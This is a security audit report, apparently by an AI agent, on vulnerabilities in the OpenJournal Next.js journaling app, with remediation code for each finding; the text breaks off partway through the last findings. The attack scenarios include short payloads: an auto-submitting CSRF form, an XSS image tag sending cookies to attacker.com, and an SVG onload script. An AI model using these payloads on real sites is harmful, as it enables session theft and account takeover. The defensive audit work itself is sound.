# Security Audit Report - OpenJournal Application
**Date:** 2025-11-16
**Auditor:** Security Engineer Agent
**Scope:** OWASP Top 10 Vulnerabilities Assessment

---

## Executive Summary

This comprehensive security audit identified **17 vulnerabilities** across the OpenJournal Next.js journaling application:
- **4 Critical** severity issues requiring immediate attention
- **8 High** severity issues posing significant security risks
- **3 Medium** severity issues needing remediation
- **2 Low** severity informational findings

**Priority Actions Required:**
1. Implement CSRF protection for all state-changing operations
2. Add rate limiting to prevent brute force and DoS attacks
3. Sanitize HTML content to prevent XSS attacks
4. Implement comprehensive security headers (CSP, HSTS, etc.)
5. Add secure 2FA secret encryption

---

## Detailed Vulnerability Findings

### 1. CROSS-SITE REQUEST FORGERY (CSRF) - MISSING PROTECTION
**Severity:** 🔴 **CRITICAL**
**OWASP Category:** A01:2021 - Broken Access Control
**CWE:** CWE-352

**Location:** All API routes (48 endpoints)
- `/app/api/auth/register/route.ts`
- `/app/api/entries/route.ts`
- `/app/api/attachments/upload/route.ts`
- All other POST/PUT/DELETE endpoints

**Description:**
The application lacks CSRF token validation on state-changing operations. NextAuth 5.0 beta does not provide built-in CSRF protection for API routes. All POST, PUT, and DELETE endpoints are vulnerable to CSRF attacks where an attacker can trick authenticated users into performing unwanted actions.

**Attack Scenario:**
```html
<!-- Attacker's malicious site -->
<form action="https://victim-journal.com/api/entries" method="POST">
  <input type="hidden" name="title" value="Hacked Entry">
  <input type="hidden" name="content" value="Malicious content">
</form>
<script>document.forms[0].submit();</script>
```

**Recommended Fix:**
Implement CSRF protection using the `edge-csrf` package or custom middleware:

```typescript
// lib/csrf.ts
import { createCsrfProtect } from '@edge-csrf/nextjs';

const csrfProtect = createCsrfProtect({
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    name: '__Host-csrf-token',
  },
});

export { csrfProtect };

// middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';
import { csrfProtect } from './lib/csrf';

export async function middleware(request: NextRequest) {
  const response = NextResponse.next();

  // Apply CSRF protection to API routes
  if (request.nextUrl.pathname.startsWith('/api/')) {
    const csrfError = await csrfProtect(request, response);
    if (csrfError) {
      return new NextResponse('CSRF token validation failed', { status: 403 });
    }
  }

  return response;
}

export const config = {
  matcher: '/api/:path*',
};
```

**Client-side implementation:**
```typescript
// Add to fetch calls
const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');
await fetch('/api/entries', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken,
  },
  body: JSON.stringify(data),
});
```

---

### 2. CROSS-SITE SCRIPTING (XSS) - STORED XSS
**Severity:** 🔴 **CRITICAL**
**OWASP Category:** A03:2021 - Injection
**CWE:** CWE-79

**Location:**
- `/app/(protected)/entries/[id]/page.tsx:191`
- `/app/(protected)/entries/[id]/versions/page.tsx` (similar pattern)

**Vulnerable Code:**
```tsx
<div
  className="entry-content"
  dangerouslySetInnerHTML={{ __html: entry.content }}
/>
```

**Description:**
Entry content is rendered using `dangerouslySetInnerHTML` without sanitization. Although content is encrypted in the database, it's decrypted and rendered as raw HTML, allowing malicious scripts injected during entry creation to execute in victim browsers.

**Attack Scenario:**
1. Attacker creates entry with content: `<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">`
2. When victim views the entry, the script executes and steals session cookies
3. Attacker gains unauthorized access to victim's account

**Recommended Fix:**
Install and use DOMPurify for HTML sanitization:

```bash
pnpm add isomorphic-dompurify
```

```typescript
// lib/sanitize.ts
import DOMPurify from 'isomorphic-dompurify';

export function sanitizeHtml(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'p', 'br', 'strong', 'em', 'u', 's',
      'ul', 'ol', 'li', 'blockquote',
      'code', 'pre', 'a'
    ],
    ALLOWED_ATTR: ['href', 'target', 'rel', 'class'],
    ALLOW_DATA_ATTR: false,
  });
}

// Update entry page component
import { sanitizeHtml } from '@/lib/sanitize';

<div
  className="entry-content"
  dangerouslySetInnerHTML={{ __html: sanitizeHtml(entry.content) }}
/>
```

---

### 3. RATE LIMITING - MISSING PROTECTION
**Severity:** 🔴 **CRITICAL**
**OWASP Category:** A07:2021 - Identification and Authentication Failures
**CWE:** CWE-307

**Location:** All API routes (48 endpoints), especially:
- `/app/api/auth/register/route.ts`
- `/app/api/auth/[...nextauth]/route.ts` (login)
- `/app/api/auth/forgot-password/route.ts`
- `/app/api/auth/2fa/verify/route.ts`

**Description:**
No rate limiting is implemented on any endpoint. This allows:
- Brute force attacks on authentication endpoints
- Account enumeration via registration/password reset
- Denial of Service (DoS) attacks through resource exhaustion
- 2FA code brute forcing (only 1 million combinations)

**Attack Scenarios:**
1. **Brute Force:** Attacker tries 1000 passwords/second against login endpoint
2. **DoS:** Attacker floods `/api/import` with large file uploads
3. **2FA Bypass:** Attacker brute forces 6-digit 2FA codes (potential 1M attempts)

**Recommended Fix:**
Implement rate limiting using `@upstash/ratelimit` or `next-rate-limit`:

```bash
pnpm add @upstash/ratelimit @upstash/redis
```

```typescript
// lib/rate-limit.ts
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

// Create rate limiters with different policies
export const authRateLimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, '15 m'), // 5 requests per 15 minutes
  analytics: true,
});

export const apiRateLimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(100, '1 m'), // 100 requests per minute
  analytics: true,
});

export const strictRateLimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(3, '1 h'), // 3 requests per hour (2FA, password reset)
  analytics: true,
});

// Helper function to apply rate limiting
export async function checkRateLimit(
  identifier: string,
  limiter: Ratelimit
): Promise<{ success: boolean; remaining: number }> {
  const { success, remaining } = await limiter.limit(identifier);
  return { success, remaining };
}

// Apply to auth routes
// app/api/auth/register/route.ts
import { authRateLimit } from '@/lib/rate-limit';
import { getIpAddress } from '@/lib/audit-log';

export async function POST(request: Request) {
  const ip = getIpAddress(request) || 'unknown';
  const { success, remaining } = await authRateLimit.limit(ip);

  if (!success) {
    return NextResponse.json(
      { error: 'Too many requests. Please try again later.' },
      {
        status: 429,
        headers: {
          'Retry-After': '900', // 15 minutes
          'X-RateLimit-Remaining': remaining.toString(),
        }
      }
    );
  }

  // Continue with registration logic...
}
```

**Per-endpoint rate limits recommended:**
- Login: 5 attempts per 15 minutes per IP
- Registration: 3 per hour per IP
- Password reset: 3 per hour per IP
- 2FA verify: 5 attempts per 15 minutes per user
- File upload: 10 per hour per user
- General API: 100 per minute per user

---

### 4. SECURITY HEADERS - MISSING CRITICAL HEADERS
**Severity:** 🔴 **CRITICAL**
**OWASP Category:** A05:2021 - Security Misconfiguration
**CWE:** CWE-1021

**Location:** `/next.config.mjs:67-92`

**Current Implementation:**
```javascript
headers: [
  {
    key: 'X-DNS-Prefetch-Control',
    value: 'on',
  },
  {
    key: 'X-Frame-Options',
    value: 'SAMEORIGIN',
  },
],
```

**Missing Headers:**
- Content-Security-Policy (CSP)
- Strict-Transport-Security (HSTS)
- X-Content-Type-Options
- Referrer-Policy
- Permissions-Policy
- X-XSS-Protection (defense in depth)

**Description:**
Critical security headers are missing, leaving the application vulnerable to:
- Clickjacking attacks (partial mitigation via X-Frame-Options)
- Man-in-the-Middle attacks (no HSTS)
- MIME-type sniffing attacks
- Information leakage via Referrer
- Unsafe inline scripts/styles (no CSP)

**Recommended Fix:**
```javascript
// next.config.mjs
async headers() {
  return [
    {
      source: '/(.*)',
      headers: [
        {
          key: 'Content-Security-Policy',
          value: [
            "default-src 'self'",
            "script-src 'self' 'unsafe-inline' 'unsafe-eval'", // Tighten after TipTap review
            "style-src 'self' 'unsafe-inline'",
            "img-src 'self' data: https:",
            "font-src 'self' data:",
            "connect-src 'self'",
            "frame-ancestors 'none'",
            "base-uri 'self'",
            "form-action 'self'",
          ].join('; '),
        },
        {
          key: 'Strict-Transport-Security',
          value: 'max-age=63072000; includeSubDomains; preload',
        },
        {
          key: 'X-Content-Type-Options',
          value: 'nosniff',
        },
        {
          key: 'X-Frame-Options',
          value: 'DENY',
        },
        {
          key: 'Referrer-Policy',
          value: 'strict-origin-when-cross-origin',
        },
        {
          key: 'Permissions-Policy',
          value: 'camera=(), microphone=(), geolocation=()',
        },
        {
          key: 'X-XSS-Protection',
          value: '1; mode=block',
        },
      ],
    },
    {
      source: '/fonts/(.*)',
      headers: [
        {
          key: 'Cache-Control',
          value: 'public, max-age=31536000, immutable',
        },
      ],
    },
  ];
},
```

**Note:** CSP requires careful tuning based on TipTap editor requirements. Start with report-only mode:
```
Content-Security-Policy-Report-Only: [policy]; report-uri /api/csp-report
```

---

### 5. SQL INJECTION - RAW QUERY VULNERABILITY
**Severity:** 🟡 **HIGH**
**OWASP Category:** A03:2021 - Injection
**CWE:** CWE-89

**Location:** `/app/api/search/suggestions/route.ts:22-29`

**Vulnerable Code:**
```typescript
const titleSuggestions = await prisma.$queryRaw<Array<{ title: string; id: string }>>`
  SELECT DISTINCT title, id
  FROM entries
  WHERE user_id = ${session.user.id}
    AND similarity(title, ${query}) > 0.3
  ORDER BY similarity(title, ${query}) DESC
  LIMIT 5
`;
```

**Description:**
While Prisma's tagged template literals provide *some* protection, the `similarity()` function call with user input and the raw SQL query pattern is risky. The query also assumes a PostgreSQL `similarity()` extension is installed, which may not be the case in all deployments.

**Risk Assessment:**
- Prisma templates escape parameters, reducing immediate SQL injection risk
- However, raw queries are harder to audit and maintain
- Database-specific function usage creates deployment dependencies
- Future modifications might introduce vulnerabilities

**Recommended Fix:**
Use Prisma's ORM methods with full-text search:

```typescript
// Option 1: Use Prisma's built-in search (no raw SQL)
const titleSuggestions = await prisma.entry.findMany({
  where: {
    userId: session.user.id,
    title: {
      contains: query,
      mode: 'insensitive',
    },
  },
  select: {
    id: true,
    title: true,
  },
  orderBy: {
    updatedAt: 'desc',
  },
  take: 5,
});

// Option 2: If PostgreSQL full-text search is required, use Prisma.sql
import { Prisma } from '@prisma/client';

const titleSuggestions = await prisma.$queryRaw<Array<{ title: string; id: string }>>(
  Prisma.sql`
    SELECT DISTINCT title, id
    FROM entries
    WHERE user_id = ${session.user.id}
      AND similarity(title, ${query}) > 0.3
    ORDER BY similarity(title, ${query}) DESC
    LIMIT 5
  `
);

// Option 3: Best - Set up PostgreSQL text search in schema
// Add to schema.prisma:
// @@index([title(ops: raw("gin_trgm_ops"))], type: Gin)
```

---

### 6. INFORMATION DISCLOSURE - SENSITIVE DATA IN LOGS
**Severity:** 🟡 **HIGH**
**OWASP Category:** A04:2021 - Insecure Design
**CWE:** CWE-532

**Location:** `/app/api/auth/forgot-password/route.ts:42-43`

**Vulnerable Code:**
```typescript
console.log(`Password reset token for ${email}: ${resetToken}`);
console.log(`Reset URL: ${process.env.NEXTAUTH_URL}/auth/reset-password?token=${resetToken}`);
```

**Description:**
Password reset tokens are logged to console in plaintext. In production environments, these logs may be:
- Stored in log aggregation systems
- Accessible to multiple developers/operators
- Retained for extended periods
- Exposed via log monitoring dashboards

This allows anyone with log access to reset user passwords.

**Attack Scenario:**
1. Attacker gains access to production logs (compromised monitoring system, insider threat)
2. Searches logs for "Password reset token"
3. Extracts valid reset tokens
4. Uses tokens to reset victim passwords within 1-hour window

**Recommended Fix:**
```typescript
// Remove sensitive logging entirely
// If debugging needed, log only non-sensitive identifiers
console.log(`Password reset initiated for user ID: ${user.id.substring(0, 8)}...`);

// Better: Use audit logging system already in place
await auditLogFromRequest(
  request,
  user.id,
  AuditAction.AUTH_PASSWORD_RESET_REQUEST,
  ResourceType.USER,
  user.id,
  { email: email.substring(0, 3) + '***' } // Partially redact email
);
```

---

### 7. WEAK 2FA SECRET STORAGE
**Severity:** 🟡 **HIGH**
**OWASP Category:** A02:2021 - Cryptographic Failures
**CWE:** CWE-311

**Location:**
- `/prisma/schema.prisma:25` - `twoFactorSecret String?`
- `/app/api/auth/2fa/setup/route.ts`

**Description:**
The 2FA secret is stored in the database as plaintext (nullable string). If the database is compromised, attackers can:
1. Extract 2FA secrets
2. Generate valid TOTP codes
3. Bypass 2FA protection entirely

**Current Schema:**
```prisma
model User {
  twoFactorSecret  String?
}
```

**Recommended Fix:**
Encrypt 2FA secrets before storage:

```typescript
// lib/2fa-encryption.ts
import crypto from 'crypto';

const ALGORITHM = 'aes-256-gcm';
const KEY = Buffer.from(process.env.ENCRYPTION_KEY!, 'base64').subarray(0, 32);

export function encrypt2FASecret(secret: string): string {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(ALGORITHM, KEY, iv);

  let encrypted = cipher.update(secret, 'utf8', 'base64');
  encrypted += cipher.final('base64');

  const authTag = cipher.getAuthTag();

  // Format: iv:authTag:encrypted
  return `${iv.toString('base64')}:${authTag.toString('base64')}:${encrypted}`;
}

export function decrypt2FASecret(encryptedSecret: string): string {
  const [ivB64, authTagB64, encrypted] = encryptedSecret.split(':');

  const iv = Buffer.from(ivB64, 'base64');
  const authTag = Buffer.from(authTagB64, 'base64');

  const decipher = crypto.createDecipheriv(ALGORITHM, KEY, iv);
  decipher.setAuthTag(authTag);

  let decrypted = decipher.update(encrypted, 'base64', 'utf8');
  decrypted += decipher.final('utf8');

  return decrypted;
}

// Update setup route
import { encrypt2FASecret } from '@/lib/2fa-encryption';

await prisma.user.update({
  where: { id: session.user.id },
  data: { twoFactorSecret: encrypt2FASecret(secret) },
});

// Update verify route
import { decrypt2FASecret } from '@/lib/2fa-encryption';

const decryptedSecret = decrypt2FASecret(user.twoFactorSecret!);
const isValid = authenticator.verify({
  token,
  secret: decryptedSecret,
});
```

---

### 8. INSUFFICIENT PASSWORD REQUIREMENTS
**Severity:** 🟡 **HIGH**
**OWASP Category:** A07:2021 - Identification and Authentication Failures
**CWE:** CWE-521

**Location:** `/app/api/auth/register/route.ts:14-18`

**Vulnerable Code:**
```typescript
if (password.length < 8) {
  return NextResponse.json(
    { error: "Password must be at least 8 characters long" },
    { status: 400 }
  );
}
```

**Description:**
Password validation only checks minimum length. Weak passwords like "password" or "12345678" are accepted, making accounts vulnerable to:
- Dictionary attacks
- Brute force attacks
- Credential stuffing

**Recommended Fix:**
Implement comprehensive password strength validation using `zxcvbn`:

```bash
pnpm add zxcvbn
```

```typescript
// lib/password-validation.ts
import zxcvbn from 'zxcvbn';

export interface PasswordValidation {
  valid: boolean;
  score: number; // 0-4
  feedback: string[];
}

export function validatePasswordStrength(
  password: string,
  userInputs: string[] = []
): PasswordValidation {
  // Minimum requirements
  if (password.length < 12) {
    return {
      valid: false,
      score: 0,
      feedback: ['Password must be at least 12 characters long'],
    };
  }

  // Check complexity
  const hasUppercase = /[A-Z]/.test(password);
  const hasLowercase = /[a-z]/.test(password);
  const hasNumber = /[0-9]/.test(password);
  const hasSpecial = /[^A-Za-z0-9]/.test(password);

  const complexityCount = [hasUppercase, hasLowercase, hasNumber, hasSpecial]
    .filter(Boolean).length;

  if (complexityCount < 3) {
    return {
      valid: false,
      score: 1,
      feedback: [
        'Password must contain at least 3 of: uppercase, lowercase, numbers, special characters',
      ],
    };
  }

  // Use zxcvbn for strength estimation
  const result = zxcvbn(password, userInputs);

  if (result.score < 3) {
    return {
      valid: false,
      score: result.score,
      feedback: [
        'Password is too weak',
        ...(result.feedback.suggestions || []),
      ],
    };
  }

  return {
    valid: true,
    score: result.score,
    feedback: ['Password strength is good'],
  };
}

// Update registration route
import { validatePasswordStrength } from '@/lib/password-validation';

const validation = validatePasswordStrength(password, [name, email]);

if (!validation.valid) {
  return NextResponse.json(
    { error: validation.feedback.join('. ') },
    { status: 400 }
  );
}
```

---

### 9. AUTHENTICATION BYPASS - NO 2FA ENFORCEMENT
**Severity:** 🟡 **HIGH**
**OWASP Category:** A07:2021 - Identification and Authentication Failures
**CWE:** CWE-288

**Location:** `/lib/auth.ts` - NextAuth configuration

**Description:**
The application supports 2FA but doesn't enforce verification after password authentication. Users with 2FA enabled can still complete login with just username/password if the 2FA verification step is skipped or bypassed.

**Current Flow:**
1. User enters credentials → authenticated
2. 2FA status is only stored in session metadata
3. No middleware enforces 2FA verification before allowing protected routes

**Recommended Fix:**
Implement 2FA verification middleware:

```typescript
// middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';
import { auth } from './lib/auth';

export async function middleware(request: NextRequest) {
  const session = await auth();

  // Check if accessing protected routes
  if (request.nextUrl.pathname.startsWith('/entries') ||
      request.nextUrl.pathname.startsWith('/settings')) {

    if (!session) {
      return NextResponse.redirect(new URL('/auth/signin', request.url));
    }

    // Check if user has 2FA enabled but not verified in this session
    if (session.user.twoFactorEnabled && !session.user.twoFactorVerified) {
      // Redirect to 2FA verification page
      if (request.nextUrl.pathname !== '/auth/2fa-verify') {
        return NextResponse.redirect(new URL('/auth/2fa-verify', request.url));
      }
    }
  }

  return NextResponse.next();
}

export const config = {
  matcher: ['/entries/:path*', '/settings/:path*'],
};

// Update session callback in lib/auth.ts
async session({ session, token }) {
  if (session.user && token.id) {
    session.user.id = token.id as string;

    const dbUser = await prisma.user.findUnique({
      where: { id: token.id as string },
      select: {
        twoFactorEnabled: true,
      },
    });

    session.user.twoFactorEnabled = dbUser?.twoFactorEnabled || false;
    session.user.twoFactorVerified = token.twoFactorVerified as boolean || false;
  }
  return session;
},
```

---

### 10. UNRESTRICTED FILE UPLOAD - MALICIOUS FILE EXECUTION RISK
**Severity:** 🟡 **HIGH**
**OWASP Category:** A04:2021 - Insecure Design
**CWE:** CWE-434

**Location:** `/lib/file-encryption.ts:82-115`

**Vulnerable Code:**
```typescript
const allowedTypes = [
  "image/svg+xml",  // ⚠️ Can contain JavaScript
  "text/html",      // ⚠️ Not in list but should be restricted
  // ... other types
];
```

**Description:**
File upload validation has several security issues:
1. **SVG files allowed** - Can contain embedded JavaScript/XSS
2. **MIME type validation only** - Can be spoofed by attackers
3. **No file content validation** - Relies solely on client-provided MIME type
4. **Large file uploads** - 10MB default limit may enable DoS

**Attack Scenarios:**
1. **SVG XSS:** Upload malicious SVG with embedded script: `<svg onload="alert(document.cookie)">`
2. **MIME spoofing:** Rename `malicious.exe` to `image.jpg`, set Content-Type to `image/jpeg`
3. **DoS:** Upload multiple 10MB files to exhaust storage/memory

**Recommended Fix:**

```typescript
// lib/file-validation.ts
import { fileTypeFromBuffer } from 'file-type';

const ALLOWED_TYPES = {
  // Images (safer subset - NO SVG)
  'image/jpeg': ['.jpg', '.jpeg'],
  'image/png': ['.png'],
  'image/gif': ['.gif'],
  'image/webp': ['.webp'],

  // Documents (read-only)
  'application/pdf': ['.pdf'],
  'text/plain': ['.txt'],
  'text/csv': ['.csv'],

  // Office (with virus scanning recommended)
  'application/vnd.openxmlformats-officedocument.wordprocessingml.document': ['.docx'],
  'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet': ['.xlsx'],

  // Audio/Video
  'audio/mpeg': ['.mp3'],
  'audio/wav': ['.wav'],
  'video/mp4': ['.mp4'],
  'video/webm': ['.webm'],
} as const;

// Size limits per file type
const SIZE_LIMITS = {
  'image/*': 5 * 1024 * 1024,      // 5MB for images
  'audio/*': 20 * 1024 * 1024,     // 20MB for audio
  'video/*': 50 * 1024 * 1024,     // 50MB for video
  'application/*': 10 * 1024 * 1024, // 10MB for documents
  'text/*': 1 * 1024 * 1024,       // 1MB for text
} as const;

export async function validateFileUpload(
  file: File
): Promise<{ valid: boolean; error?: string }> {
  // 1. Check file size first (before reading buffer)
  const mimeCategory = file.type.split('/')[0] + '/*';
  const sizeLimit = SIZE_LIMITS[mimeCategory] || 10 * 1024 * 1024;

  if (file.size > sizeLimit) {
    return {
      valid: false,
      error: `File too large. Maximum size: ${formatFileSize(sizeLimit)}`,
    };
  }

  // 2. Read file buffer for content-based validation
  const arrayBuffer = await file.arrayBuffer();
  const buffer = Buffer.from(arrayBuffer);

  // 3. Validate actual file type from content (not just MIME)
  const fileType = await fileTypeFromBuffer(buffer);

  if (!fileType) {
    return {
      valid: false,
      error: 'Could not determine file type',
    };
  }

  // 4. Verify MIME type matches actual content
  if (fileType.mime !== file.type) {
    return {
      valid: false,
      error: `File type mismatch. Claimed: ${file.type}, Actual: ${fileType.mime}`,
    };
  }

  // 5. Check against allowlist
  if (!ALLOWED_TYPES[fileType.mime]) {
    return {
      valid: false,
      error: `File type not allowed: ${fileType.mime}`,
    };
  }

  // 6. Validate file extension
  const ext = '.' + file.name.split('.').pop()?.toLowerCase();
  if (!ALLOWED_TYPES[fileType.mime].includes(ext)) {
    return {
      valid: false,
      error: `Invalid file extension for type ${fileType.mime}`,
    };
  }

  // 7. Additional content scanning for specific types
  if (fileType.mime === 'application/pdf') {
    // Check for embedded JavaScript in PDF
    const content = buffer.toString('utf8');
    if (content.includes('/JavaScript') || content.includes('/JS')) {
      return {
        valid: false,
        error: 'PDF contains potentially malicious JavaScript',
      };
    }
  }

  return { valid: true };
}
```

**Deployment Note:** For production, integrate with antivirus scanning service (ClamAV, VirusTotal API).

---

### 11. ACCESS CONTROL - IDOR IN USER SEARCH
**Severity:** 🟡 **HIGH**
**OWASP Category:** A01:2021 - Broken Access Control
**CWE:** CWE-639

**Location:** `/app/api/users/route.ts:9-41`

**Vulnerable Code:**
```typescript
export async function GET(request: NextRequest) {
  const session = await auth();
  if (!session?.user?.id) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const email = searchParams.get("email");

  const user = await prisma.user.findUnique({
    where: { email },
    select: {
      id: true,
      name: true,
      email: true,
      image: true,
    },
  });

  return NextResponse.json({ user });
}
```

**Description:**
Any authenticated user can search for other users by email without proper authorization checks. This enables:
- Email enumeration attacks
- Information disclosure about registered users
- Reconnaissance for social engineering attacks

**Attack Scenario:**
```javascript
// Attacker script to enumerate users
const emails = ['admin@company.com', 'ceo@company.com', 'user@victim.com'];
for (const email of emails) {
  const res = await fetch(`/api/users?email=${email}`);
  if (res.ok) console.log(`Found: ${email}`);
}
```

**Recommended Fix:**

```typescript
/**
 * GET /api/users?email=xxx
 * Search for a user by email (ADMIN only for role assignment)
 */
export async function GET(request: NextRequest) {
  const session = await auth();
  if (!session?.user?.id) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  // Check if user has ADMIN role
  const isAdmin = await prisma.userRoleAssignment.findFirst({
    where: {
      userId: session.user.id,
      role: "ADMIN",
    },
  });

  if (!isAdmin) {
    return NextResponse.json(
      { error: "Forbidden: Admin access required" },
      { status: 403 }
    );
  }

  const email = searchParams.get("email");

  if (!email) {
    return NextResponse.json({ error: "Email parameter is required" }, { status: 400 });
  }

  // Rate limit user searches
  const { success } = await apiRateLimit.limit(`user-search:${session.user.id}`);
  if (!success) {
    return NextResponse.json({ error: "Too many requests" }, { status: 429 });
  }

  const user = await prisma.user.findUnique({
    where: { email },
    select: {
      id: true,
      name: true,
      email: true,
      image: true,
    },
  });

  if (!user) {
    // Return generic error to prevent email enumeration
    return NextResponse.json(
      { error: "User not found" },
      { status: 404 }
    );
  }

  // Audit log the search
  await createAuditLog({
    userId: session.user.id,
    action: 'user.search',
    resourceType: 'user',
    resourceId: user.id,
    metadata: { searchedEmail: email },
  });

  return NextResponse.json({ user });
}
```

---

### 12. INSECURE DESERIALIZATION - IMPORT ROUTE
**Severity:** 🟠 **MEDIUM**
**OWASP Category:** A08:2021 - Software and Data Integrity Failures
**CWE:** CWE-502

**Location:** `/app/api/import/route.ts:133-204`

**Vulnerable Code:**
```typescript
case "json": {
  const data = parseFullExport(fileContent);

  // Import workspaces with user-controlled IDs
  await prisma.workspace.upsert({
    where: { id: workspace.id },  // ⚠️ User controls ID
    update: { ... },
    create: {
      id: workspace.id,  // ⚠️ User controls ID
      userId: session.user.id,
    },
  });
```

**Description:**
The JSON import feature accepts user-provided IDs for workspaces, categories, and entries without validation. This could allow:
- ID collision attacks (overwriting other users' data if ID generation is predictable)
- Database integrity issues
- Potential privilege escalation if IDs are manipulated

**Recommended Fix:**

```typescript
// lib/import-export.ts
import { validate as validateUuid } from 'uuid';

export function validateImportData(data: any): { valid: boolean; errors: string[] } {
  const errors: string[] = [];

  // Validate structure
  if (!data.entries || !Array.isArray(data.entries)) {
    errors.push('Invalid export format: missing entries array');
  }

  // Validate IDs are proper UUIDs
  for (const workspace of data.workspaces || []) {
    if (!validateUuid(workspace.id)) {
      errors.push(`Invalid workspace ID: ${workspace.id}`);
    }
  }

  for (const category of data.categories || []) {
    if (!validateUuid(category.id)) {
      errors.push(`Invalid category ID: ${category.id}`);
    }
  }

  // Limit import size to prevent DoS
  if (data.entries.length > 10000) {
    errors.push('Import too large: maximum 10,000 entries allowed');
  }

  return {
    valid: errors.length === 0,
    errors,
  };
}

// Update import route
case "json": {
  const data = parseFullExport(fileContent);

  // Validate import data
  const validation = validateImportData(data);
  if (!validation.valid) {
    return NextResponse.json(
      { error: 'Invalid import data', details: validation.errors },
      { status: 400 }
    );
  }

  // Generate new IDs for all imported entities
  const idMapping = new Map<string, string>();

  for (const workspace of data.workspaces || []) {
    const oldId = workspace.id;
    const newId = crypto.randomUUID();
    idMapping.set(oldId, newId);

    await prisma.workspace.create({
      data: {
        id: newId,  // Use generated ID, not user-provided
        name: workspace.name,
        description: workspace.description,
        type: workspace.type,
        userId: session.user.id,
      },
    });
  }

  // Update all references using the ID mapping
  // ... similar for categories and entries
}
```

---

### 13. WEAK BCRYPT COST FACTOR
**Severity:** 🟠 **MEDIUM**
**OWASP Category:** A02:2021 - Cryptographic Failures
**CWE:** CWE-916

**Location:** `/app/api/auth/register/route.ts:31`

**Vulnerable Code:**
```typescript
const hashedPassword = await bcrypt.hash(password, 12);
```

**Description:**
BCrypt cost factor of 12 is the current default but is on the lower end of recommended values. As computing power increases, this becomes easier to brute force. OWASP recommends cost factor of 13-14 for better resistance to offline attacks.

**Performance vs Security:**
- Cost 12: ~250ms per hash
- Cost 13: ~500ms per hash
- Cost 14: ~1000ms per hash

**Recommended Fix:**

```typescript
// lib/password-hashing.ts
const BCRYPT_COST_FACTOR = 13; // Increase from 12 to 13

export async function hashPassword(password: string): Promise<string> {
  return bcrypt.hash(password, BCRYPT_COST_FACTOR);
}

export async function verifyPassword(password: string, hash: string): Promise<boolean> {
  return bcrypt.compare(password, hash);
}

// Update registration route
import { hashPassword } from '@/lib/password-hashing';

const hashedPassword = await hashPassword(password);
```

---

### 14. SESSION FIXATION VULNERABILITY
**Severity:** 🟠 **MEDIUM**
**OWASP Category:** A07:2021 - Identification and Authentication Failures
**CWE:** CWE-384

**Location:** `/lib/auth.ts:20` - JWT session strategy

**Description:**
Using JWT session strategy without proper session rotation after privilege changes (login, 2FA verification) could allow session fixation attacks.

**Current Configuration:**
```typescript
session: { strategy: "jwt" },
```

**Recommended Fix:**

```typescript
// lib/auth.ts
export const { handlers, signIn, signOut, auth } = NextAuth({
  adapter: PrismaAdapter(prisma),
  session: {
    strategy: "jwt",
    maxAge: 30 * 24 * 60 * 60, // 30 days
    updateAge: 24 * 60 * 60,   // 24 hours - refresh session daily
  },
  callbacks: {
    async jwt({ token, user, trigger }) {
      // Regenerate token on sign in
      if (user) {
        token.id = user.id;
        token.sessionVersion = crypto.randomUUID(); // Add version tracking
      }

      // Force token refresh on update
      if (trigger === "update") {
        token.sessionVersion = crypto.randomUUID();
      }

      return token;
    },
    async session({ session, token }) {
      if (session.user && token.id) {
        session.user.id = token.id as string;
        session.user.sessionVersion = token.sessionVersion as string;

        const dbUser = await prisma.user.findUnique({
          where: { id: token.id as string },
          select: { twoFactorEnabled: true },
        });

        session.user.twoFactorEnabled = dbUser?.twoFactorEnabled || false;
      }
      return session;
    },
  },
});

// Implement session invalidation on security events
export async function invalidateUserSessions(userId: string) {
  // With JWT, increment a session version counter in database
  await prisma.user.update({
    where: { id: userId },
    data: { sessionVersion: { increment: 1 } },
  });
}

// Add middleware to check session version
// middleware.ts
const session = await auth();
if (session?.user?.sessionVersion) {
  const dbUser = await prisma.user.findUnique({
    where: { id: session.user.id },
    select: { sessionVersion: true },
  });

  if (dbUser?.sessionVersion !== session.user.sessionVersion) {
    // Session invalidated, force re-login
    return NextResponse.redirect(new URL('/auth/signin', request.url));
  }
}
```

---

### 15. UNVALIDATED REDIRECTS - POTENTIAL OPEN REDIRECT
**Severity:** 🟢 **LOW**
**OWASP Category:** A01:2021 - Broken Access Control
**CWE:** CWE-601

**Location:** Various authentication flows

**Description:**
While not currently exploitable, the authentication flows should validate redirect URLs to prevent future open redirect vulnerabilities if callback URLs are added.

**Recommended Fix:**

```typescript
// lib/redirect-validation.ts
export function isValidRedirect(url: string): boolean {
  try {
    const parsed = new URL(url, process.env.NEXTAUTH_URL);

    // Only allow same-origin redirects
    const allowedOrigin = new URL(process.env.NEXTAUTH_URL!).origin;

    return parsed.origin === allowedOrigin;
  } catch {
    return false;
  }
}

export function getSafeRedirect(url: string | null, fallback: string = '/'): string {
  if (!url) return fallback;

  if (isValidRedirect(url)) {
    return url;
  }

  console.warn(`Blocked unsafe redirect attempt: ${url}`);
  return fallback;
}
```

---

### 16. LACK OF INPUT VALIDATION - COMMENT LENGTH
**Severity:** 🟢 **LOW**
**OWASP Category:** A03:2021 - Injection
**CWE:** CWE-20

**Location:** `/app/api/comments/route.ts:8-12`

**Current Validation:**
```typescript
const createCommentSchema = z.object({
  entryId: z.string().cuid(),
  content: z.string().min(1).max(10000),  // ⚠️ 10K chars per comment
  parentId: z.string().cuid().optional(),
});
```

**Description:**
10,000 characters per comment is excessive and could enable:
- Database bloat from spam comments
- UI rendering issues with very long comments
- DoS through resource exhaustion

**Recommended Fix:**

```typescript
const createCommentSchema = z.object({
  entryId: z.string().cuid(),
  content: z.string()
